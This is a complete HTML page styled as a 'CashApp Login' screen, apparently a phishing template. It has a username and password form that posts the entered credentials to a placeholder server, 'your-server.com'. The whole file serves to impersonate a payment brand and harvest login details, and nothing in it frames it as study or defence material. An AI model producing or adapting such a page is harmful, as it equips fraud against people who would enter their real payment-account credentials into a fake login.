<!DOCTYPE html>
<html>
<head>
<title>CashApp Login</title>
<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    text-align: center;
}
.container {
    width: 50%;
    margin: 0 auto;
    padding: 20px;
    background-color: #fff;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}
input {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    box-sizing: border-box;
}
button {
    padding: 10px 20px;
    background-color: #007aff;
    color: #fff;
    border: none;
    border-radius: 5px;
}
</style>
</head>
<body>
<div class="container">
    <h1>Welcome to CashApp</h1>
    <form action="https://your-server.com/login" method="POST">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
</div>
</body>
</html>
